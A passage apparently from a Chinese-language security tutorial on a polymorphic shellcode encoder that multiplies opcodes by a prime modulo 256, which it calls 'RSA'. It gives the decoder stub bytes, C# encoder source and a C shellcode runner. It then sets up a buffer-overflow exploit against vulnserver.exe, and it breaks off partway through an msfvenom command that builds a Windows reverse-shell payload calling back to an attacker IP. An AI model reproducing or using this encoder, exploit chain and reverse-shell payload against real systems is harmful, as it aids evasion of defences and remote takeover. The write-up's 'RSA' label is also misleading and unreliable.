src="http://p1.qhimg.com/t01cedabd1104e53211.png" title="t016eeb7e9ee9b02576.png" alt="http://p8.qhimg.com/t016eeb7e9ee9b02576.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">操作码66和67表示确定最终字符串的长度和跳转地址的垃圾操作码，这产生问题，有必要重新计算长度。这些操作码应该被省略。为此，我们必须将header [BITS 32]添加到ASM程序的文件中，这样当解密完成时，这些操作码被省略：</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01a590e0b4aa18e206.png" title="t015ad8c6497f24df66.png" alt="http://p2.qhimg.com/t015ad8c6497f24df66.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第一版本中的加密程序具有存储shellcode的大小的限制。根据程序的设计，十六进制的这个数字存储在ECX（计数器）的下部，即在CL中。这里明显可以看到限制，因为你可以存储的最大数字是FF，即255个字符，因为其只使用16位。在下面的加密程序代码中可以看到这个事实：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">xor&nbsp;ecx,ecx
mov&nbsp;cl,33</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">当加密的</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">shellcode</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">的有效载荷具有多于</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">255</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">个操作码时，该限制完全暴露，该限制在任何反向</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">shellcode</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">上非常普遍，原因是其数量大于</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">255</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">个操作码。为解决这个限制，使用了所有的</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">ECX</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">寄存器。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">下面是ASM上的数据寄存器的结构：</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t013a302e798ee37bf1.png" title="t01250835cc027b849e.png" alt="http://p0.qhimg.com/t01250835cc027b849e.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">为此，有必要使用所有的ECX寄存器来分配shellcode的总长度。程序如下：</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t015d18706c0843217d.png" title="t01df6c545a1b9a6ebd.png" alt="http://p1.qhimg.com/t01df6c545a1b9a6ebd.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">所做的基本改变是使用ECX寄存器的高部，由以下两行中的CX表示：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">mov&nbsp;cx,376
sub&nbsp;cx,1</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">做出这一改变后，这便是我们在堆栈中的新位置：</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01533b99ceaafb8664.png" title="t0167d40cc45abfa2ee.png" alt="http://p1.qhimg.com/t0167d40cc45abfa2ee.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">重要的一行是：</span></p><pre class="brush:plain;toolbar:false">00000009&nbsp;66B978018A44&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;ecx,0x448a0178</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">其中可以看出，值</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">378</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">以</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">32</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">位格式成功分配。这样，密码程序已经能够处理大</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">shellcode</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">，字符多达</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">32</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">位许可证。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">加密程序</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">对于加密程序的实现，我们选择了</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">C</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">＃</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">.NET</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">，因为其具有可移植性且代码易于理解，这方便算法的解释。对于程序的阐述，我们不提供所有代码，而是将展示和解释加密的重要部分。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">该程序在主表单的2个类中执行，主类负责加密、读取和操作码结束的暴露，另一个类只负责获取十六进制数。负责转换为十六进制的类如下所示：</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t018d1cfbc63cc890f0.png" title="t01f85b8f9c2c10fb69.png" alt="http://p4.qhimg.com/t01f85b8f9c2c10fb69.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">其是一个小类，已声明为静态，以便随时访问ToHexString方法，此方法执行到十六进制的转换，并返回作为类型字符串转换的数字。这是程序的核心，加密和最终链在此完成：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">private&nbsp;void&nbsp;button1_Click(object&nbsp;sender,&nbsp;EventArgs&nbsp;e)
{
string[]&nbsp;cShellcode&nbsp;=&nbsp;{&nbsp;&quot;\\xEB&quot;,&nbsp;&quot;\\x1C&quot;,&nbsp;&quot;\\x5E&quot;,&nbsp;&quot;\\x31&quot;,&nbsp;&quot;\\xC9&quot;,&nbsp;&quot;\\x31&quot;,&nbsp;&quot;\\xC0&quot;,
&quot;\\x31&quot;,&nbsp;&quot;\\xDB&quot;,&nbsp;&quot;\\xB1&quot;,&nbsp;&quot;\\x00&quot;,&nbsp;&quot;\\x8A&quot;,&nbsp;&quot;\\x44&quot;,&nbsp;&quot;\\x0E&quot;,&nbsp;&quot;\\xFF&quot;,&nbsp;&quot;\\xB3&quot;,&nbsp;&quot;\\xAB&quot;,&nbsp;&quot;\\xF6&quot;,
&quot;\\xE3&quot;,&nbsp;&quot;\\x88&quot;,&nbsp;&quot;\\x44&quot;,&nbsp;&quot;\\x0E&quot;,&nbsp;&quot;\\xFF&quot;,&nbsp;&quot;\\x80&quot;,&nbsp;&quot;\\xE9&quot;,&nbsp;&quot;\\x01&quot;,&nbsp;&quot;\\x75&quot;,&nbsp;&quot;\\xEF&quot;,&nbsp;&quot;\\xEB&quot;,
&quot;\\x05&quot;,&nbsp;&quot;\\xE8&quot;,&nbsp;&quot;\\xDF&quot;,&nbsp;&quot;\\xFF&quot;,&nbsp;&quot;\\xFF&quot;,&nbsp;&quot;\\xFF&quot;&nbsp;};
richTextBox2.Clear();
string&nbsp;[]&nbsp;separadores&nbsp;=&nbsp;{&nbsp;&quot;/x&quot;,&quot;\\x&quot;&nbsp;};
string&nbsp;shellcodeOri&nbsp;=&nbsp;richTextBox1.Text.Replace(&quot;\&quot;&quot;,&quot;&quot;);
string[]&nbsp;opcodes&nbsp;=&nbsp;shellcodeOri.Split(separadores,
System.StringSplitOptions.RemoveEmptyEntries);
string[]&nbsp;opcodesInterno=new&nbsp;string[opcodes.Length];
decimal&nbsp;tamShellcode&nbsp;=&nbsp;(decimal)(opcodes.Length&nbsp;+&nbsp;25);
cShellcode[10]&nbsp;=&nbsp;&quot;\\x&quot;&nbsp;+&nbsp;tamShellcode.ToHexString().ToString();
int&nbsp;contador&nbsp;=&nbsp;0;
int&nbsp;contador1&nbsp;=&nbsp;0;
int&nbsp;contador2&nbsp;=&nbsp;0;
if&nbsp;(cifrador&nbsp;==&nbsp;1)
{
richTextBox2.Text&nbsp;=&nbsp;&quot;//************RSA&nbsp;DECODER************&quot;&nbsp;+&nbsp;&quot;\n&quot;;
foreach&nbsp;(string&nbsp;j&nbsp;in&nbsp;cShellcode)
{
if&nbsp;(contador1&nbsp;==&nbsp;10)
{
richTextBox2.Text&nbsp;+=&nbsp;&quot;\n&quot;;
contador1&nbsp;=&nbsp;0;
}
richTextBox2.Text&nbsp;+=&nbsp;j;
contador1++;
}
richTextBox2.Text&nbsp;+=&nbsp;&quot;\n//********ENCODED&nbsp;SHELLCODE*********&quot;&nbsp;+&nbsp;&quot;\n&quot;;
}
foreach&nbsp;(string&nbsp;s&nbsp;in&nbsp;opcodes)
{
//MessageBox.Show(System.Convert.ToDecimal(s).ToString());
try
{
decimal&nbsp;opc&nbsp;=&nbsp;int.Parse(s,&nbsp;System.Globalization.NumberStyles.HexNumber)&nbsp;*
usePrime;&nbsp;//&nbsp;System.Convert.ToDecimal(s)&nbsp;*&nbsp;3;
opc&nbsp;=&nbsp;opc&nbsp;%&nbsp;useModule;
var&nbsp;hex&nbsp;=&nbsp;opc.ToHexString();
if&nbsp;(hex.ToString().Length&nbsp;==&nbsp;1)
{
opcodesInterno[contador]&nbsp;=&nbsp;&quot;\\x0&quot;&nbsp;+&nbsp;hex.ToString();
}
else
{
opcodesInterno[contador]&nbsp;=&nbsp;&quot;\\x&quot;&nbsp;+&nbsp;hex.ToString();
}
//MessageBox.Show(opcodesInterno[contador]);
contador++;
}
catch&nbsp;(Exception&nbsp;ex)&nbsp;{&nbsp;MessageBox.Show(ex.ToString());&nbsp;}
}
foreach&nbsp;(string&nbsp;s2&nbsp;in&nbsp;opcodesInterno)
{
try
{
if&nbsp;(contador2&nbsp;==&nbsp;10)
{
richTextBox2.Text&nbsp;+=&nbsp;&quot;\n&quot;;
contador2&nbsp;=&nbsp;0;
}
richTextBox2.Text&nbsp;+=&nbsp;s2.ToString();
contador2++;
}
catch&nbsp;{&nbsp;MessageBox.Show(&quot;Formato&nbsp;de&nbsp;Opcodes&nbsp;Incorrecto&quot;);&nbsp;}
}
textBox1.Text&nbsp;=&nbsp;opcodes.Length.ToString();
textBox2.Text&nbsp;=&nbsp;opcodesInterno.Length.ToString();
Array.Clear(opcodes,&nbsp;0,&nbsp;opcodes.Length);
Array.Clear(opcodesInterno,&nbsp;0,&nbsp;opcodesInterno.Length);
decimal&nbsp;temp&nbsp;=&nbsp;(decimal)usePrime;
textBox3.Text&nbsp;=&nbsp;&quot;DEC:&nbsp;&quot;+usePrime.ToString()&nbsp;+&nbsp;&quot;||&nbsp;HEX:&quot;&nbsp;+
temp.ToHexString().ToString();&nbsp;;
textBox5.Text&nbsp;=&nbsp;useModule.ToString();
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">首先，我们声明一个表示加密算法的字符串变量，还声明了分隔符的排列，这些分隔符随后将用于清除在</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">RichBox</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">类型的组件中输入的链。读取此组件并清除表示要加密的操作码的初始字符串：</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t010941a22966a6c8f6.png" title="t010b3de5ccf8040f30.png" alt="http://p8.qhimg.com/t010b3de5ccf8040f30.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">C＃.Net有一个友好的框架，因此输入的读取易于执行，读取输入到主RichBox中的内容在单行进行，然后在检测到onClick事件时解析和清除：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">string&nbsp;shellcodeOri&nbsp;=&nbsp;richTextBox1.Text.Replace(&quot;\&quot;&quot;,&quot;&quot;);
string[]&nbsp;opcodes&nbsp;=&nbsp;shellcodeOri.Split(separadores,&nbsp;System.StringSplitOptions.RemoveEmptyEntries);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">可以看到，</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">richbox</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">组件的名称为</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">richBox1</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">：</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t018cadbca7e8b5080b.png" title="t014cc5e3ad968d92f7.png" alt="http://p8.qhimg.com/t014cc5e3ad968d92f7.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">方法Replace被调用，其包含在空间Text中，并且重载了用于填充新的排列类型字符串（2x2）和将包含要加密的shellcode的间隔符。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">另一点要强调的是类型decimal的变量，其表示原始shellcode的大小，即单独表示操作码的对的数目，分配了25的偏移，即多25个位置，以确保解密算法将应用整个shellcode。随后将打印最终字符串：</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01242a551325bbbc70.png" title="t012971e9472062da4c.png" alt="http://p2.qhimg.com/t012971e9472062da4c.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">变量“cifrador”是允许程序决定是否打印密码的指示。其是在程序开始时声明的静态变量：“public static int encryptor;”&nbsp;且在主程序的加载事件期间被初始化为构造器结构：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">public&nbsp;Form1()
{
InitializeComponent();
usePrime&nbsp;=&nbsp;3;
useModule&nbsp;=&nbsp;256;
cifrador&nbsp;=&nbsp;1;
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">此变量使用值1初始化，因此默认情况下将一次打印一个加密代码，有可能观察到集成if结构的“foreach”。在代码的下一部分中，存在核心功能的主要部分，即每个操作码由指定的素数加密：</span><br/><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t0198e2a7871a8135f2.png" title="t01588ba56a9e5f0d17.png" alt="http://p4.qhimg.com/t01588ba56a9e5f0d17.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">变量“usePrime”是从Form2提取的变量，其指定执行加密要乘以的素数：</span></p><pre class="brush:plain;toolbar:false">decimal&nbsp;opc&nbsp;=&nbsp;int.Parse(s,&nbsp;System.Globalization.NumberStyles.HexNumber)&nbsp;*&nbsp;usePrime;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">正是在这一点上，程序加密每个操作码，最终得到模块：opc = opc％useModule；变量“useModule”也被导出，结果保存在数组：opcodesInterno []中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后打印已经加密的最终字符串，其将在加密代码后立即打印：</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01407dc265bb6777a7.png" title="t01816055775d34b301.png" alt="http://p9.qhimg.com/t01816055775d34b301.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">打印该链的重点是位置编号11。我们在ASM中的程序创建中进行了回顾，位置11表示要加密的shellcode的大小，因此被替换为操作码10（由于第一个元素为0），如下所示：</span></p><pre class="brush:plain;toolbar:false">cShellcode[10]&nbsp;=&nbsp;&quot;\\x&quot;&nbsp;+&nbsp;tamShellcode.ToHexString().ToString();</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">以这种方式得出加密主引擎结论。程序还有第二种形式，其允许选择选项并提供给这个程序。套件的功能是使用不同的数字对来加密shellcode，这也包括2个类，其中1个用于生成素数。主类负责收集在主Form中用于加密的数据。以下是第一个类：</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01e77ca9c633833b6c.png" title="t0196d94d705c41a648.png" alt="http://p5.qhimg.com/t0196d94d705c41a648.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">前面的代码验证数字是否为素数。类也被声明为静态，以便使用主方法“isPrime”从任何点访问它，如果数字是素数，则返回true，如果不是，则返回false。第二个类是主体，有几个方法，主要的一个允许选择素数，并且通过用前100个素数填充ComboBox来实现：</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t014a9fd0dcf202aec2.png" title="t0186cb507f06f687ed.png" alt="http://p3.qhimg.com/t0186cb507f06f687ed.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第二种方法是使用主按钮的onClick事件启动，其负责将选择发送到上述主Form：</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t015f6c065b91f0ca96.png" title="t0168d165e5c639a315.png" alt="http://p2.qhimg.com/t0168d165e5c639a315.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">程序编译后，结果如下：</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01cf161853ad13fa83.png" title="t018b495650b665e123.png" alt="http://p4.qhimg.com/t018b495650b665e123.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们可以看到，程序将加密代码放在首位，随后是加密的shellcode，有可能直接从文本文件上传程序：</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01976f031dee3fe7ad.png" title="t01699b81fffb1bf024.png" alt="http://p6.qhimg.com/t01699b81fffb1bf024.png"/></p><p style="text-align:center"><img src="http://p8.qhimg.com/t015e803c50fadeaa01.png" title="t0189a4a37c7dae8e8d.png" alt="http://p0.qhimg.com/t0189a4a37c7dae8e8d.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">素数的选择必须链接到先前选择的也是素数的数字，两者表示密钥对（公钥和私钥），因此，RSA算法的实现是成功的。程序的主引擎不使用本机Windows API（因此其从头开始实现转换为十六进制），这个多态性shellcode RSA的套件生成器能够在Linux上运行、能使用wine，这使它具有多平台的能力：</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01fcfc6ddb7d3f78a9.png" title="t01fc5727f966fcb7de.png" alt="http://p4.qhimg.com/t01fc5727f966fcb7de.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这个版本可以使用了，我们只需要指定我们想要的shellcode、素数对及模块（默认为256），点击“Encode”，最后的链将显示在称为“Shellcode Encoded”的字段中。此链可以插入一个偏移量为3个空字符的利用代码中，以确保整个shellcode的解密。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">多态&nbsp;RSA SHELLCODE的本地测试</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在这一点上，我们已经拥有执行第一次本地测试的两个关键点：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1.&nbsp;由opcodes表示的加密算法准备好与真正的shellcode工作</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2.&nbsp;能够非对称加密每个操作码的程序</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们使用没有大小限制的版本进行本地测试。我们将使用以下表示加密的shellcode并加密到32位的字符串：</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t0172d91c3a8a774775.png" title="t01a01546bc10cfdd20.png" alt="http://p9.qhimg.com/t01a01546bc10cfdd20.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这是我们将使用的用于查看堆栈的状态的源代码，写在C上：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">int&nbsp;main()
{
printf(&quot;Shellcode&nbsp;Length:&nbsp;%d\n&quot;,&nbsp;(int)strlen(code));
int&nbsp;(*ret)()&nbsp;=&nbsp;(int(*)())code;
ret();
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在编译并加载到GDB之后，以下是堆栈的状态：</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t0137841db211ed06b1.png" title="t0122559fc8dd6ab055.png" alt="http://p5.qhimg.com/t0122559fc8dd6ab055.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，从地址0到31是解密，然后从33是加密的shellcode，此时不具有任何一致性。为了在shellcode解密后执行完成前查看堆栈的状态，我们将在shellcode加密中在末尾更改操作码的内容。这将导致运行时错误，但我们将获得堆栈的状态。出现该错误之前，预期可以看到彼时shellcode如何被破译，具有shellcode &quot;wrong&quot;的程序如下：</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01eaa63e862eed0322.png" title="t01d2c5f13ba1f883c4.png" alt="http://p0.qhimg.com/t01d2c5f13ba1f883c4.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">更改的值为“9A”，程序被编译：</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01ec291a35cd37bb5a.png" title="t01d867a3a5ee4f734f.png" alt="http://p4.qhimg.com/t01d867a3a5ee4f734f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">由于所做的更改，其执行不成功，以下显示的是运行二进制文件前的调试会话，注意堆栈有shellcode密码：</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t01391ebd4a8f94043a.png" title="t01adbad147252f2399.png" alt="http://p7.qhimg.com/t01adbad147252f2399.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">二进制被执行，我们可以观察到栈从+38行开始</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t017dbef0fa432e4fb9.png" title="t01a59956d9d8b887ea.png" alt="http://p3.qhimg.com/t01a59956d9d8b887ea.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，shellcode被成功解密，并停在点81，这正是我们改变操作码来实现这个目的的点，现在只需修正更改的操作码，观察到shell被正确执行：</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t019b87f614ec860340.png" title="t01fe959fd9cc34519c.png" alt="http://p7.qhimg.com/t01fe959fd9cc34519c.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">结果是一个Shell，表示其已经成功地在运行时实现了解密的代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">多态性执行的远程测试</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">为了演示该算法的完整功能和其在真正脆弱的系统上的实现，首先，我们需要检测有漏洞应用程序，然后执行利用代码。为此，采用了一个称为vulnserver.exe的应用程序服务器，这是一个监听端口9999并在Windows中默认运行的服务器，已在Windows 7中实现，服务器的IP是192.168.1.76，并有&nbsp;以下选项：</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t0180a8e0a89749b11a.png" title="t01f6b79bbc20521e0b.png" alt="http://p9.qhimg.com/t01f6b79bbc20521e0b.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">每次服务器接收到连接时，显示已成功建立：</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t017c742063ca6b1899.png" title="t0111b476b553fea5e8.png" alt="http://p3.qhimg.com/t0111b476b553fea5e8.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">服务器有一个当时被利用的缓冲区溢出。一旦建立连接，将发送最多5000个字符的字符串。为了测试是否充分利用，我们运行以下用python编写脚本：</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01b5dca5785e3a921b.png" title="t0156dd999728ded521.png" alt="http://p8.qhimg.com/t0156dd999728ded521.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">程序建立连接并发送50000次字符“A”，导致了缓冲区溢出。这在服务器中以以下方式表现：</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t014d38d0501b2f8cce.png" title="t01c5e4bc1e4fb3ebca.png" alt="http://p5.qhimg.com/t01c5e4bc1e4fb3ebca.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">所以，知道服务器有一个缓冲区溢出后，开发了利用代码，以下是具有正确跳转地址的利用代码：</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01e37935594ecee774.png" title="t010f04d3b9f04a91e0.png" alt="http://p5.qhimg.com/t010f04d3b9f04a91e0.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">现在有必要添加将被注入到远程系统的shellcode。这是整个过程的微妙部分。生成shellcode必须遵循基本的攻击规则，这不是在本地执行shell，而是由特定端口在攻击者的机器中接收它。为了实现这一点，我们将使用Kali。重要的是要强调，由于使用反向shell，攻击者机器的IP是非常重要的，在这种情况下，攻击者机器的IP是192.168.1.93，反向shell是防火墙的真正专业实现的示例，其中其阻止不在白名单中的任何其他端口，但忽略了不同端口的绑定，本例中为4444：</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01aa5eb00f4de424db.png" title="t01ede72f9ac743c2ad.png" alt="http://p1.qhimg.com/t01ede72f9ac743c2ad.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这是将要使用的连接类型——反向Shell。以这样的方式，用于生成此类型的shellcode的命令如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">root@kali:~#&nbsp;msfvenom&nbsp;-a&nbsp;x86&nbsp;–platform&nbsp;Windows&nbsp;-p&nbsp;windows/shell_reverse_tcp&nbsp;LHOST=192.168.1.93&nbsp;LPORT=4444&nbsp;-e
